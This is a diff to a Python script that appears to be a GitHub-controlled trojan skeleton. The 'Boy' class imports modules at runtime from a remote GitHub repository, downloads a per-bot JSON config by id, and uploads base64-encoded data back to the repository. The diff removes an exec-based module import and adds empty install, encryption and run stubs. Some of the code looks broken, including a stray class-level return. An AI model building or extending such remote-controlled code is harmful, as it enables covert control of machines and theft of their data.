@@ -1,11 +1,17 @@
 #!/usr/bin/env python
+import json
+import base64
 from github3 import login
 from httpimp import add_remote_repo
 add_remote_repo(['toy'], 'https://raw.githubusercontent.com/how2how/toy/master/')
+try:
+    from urllib2 import urlopen
+except ImportError:
+    from urllib.request import urlopen
 
 
 class Boy(object):
-    config_url = 'https://raw.githubusercontent.com/how2how/toy/master/config/'
+    config_url = 'https://raw.githubusercontent.com/how2how/toy/master/toy/config/'
 
     def __init__(self, guser, gpass, repo):
         self._id = 'abc'
@@ -26,16 +32,19 @@ class Boy(object):
         self.repo.create_file(remote_path, msg, base64.b64encode(data))
     return
 
-    def get_config(self):
-        config_json = get_file_contents(_config)
-        config = json.loads(base64.b64decode(config_json))
-        configured = True
+    def get_config(self, config_url=None):
+        _url = config_url or self.config_url + self._id + '.json'
+        config = urlopen(_url).read()
+        return json.loads(config)
 
-        for task in config:
-            if task['module'] not in sys.modules:
-                exec('import %s' % task['module'])
+    def install(self):
+        pass
 
-        return config
+    def enc(self, data):
+        pass
 
+    def dec(self, data):
+        pass
 
-
+    def run(self):
+        pass
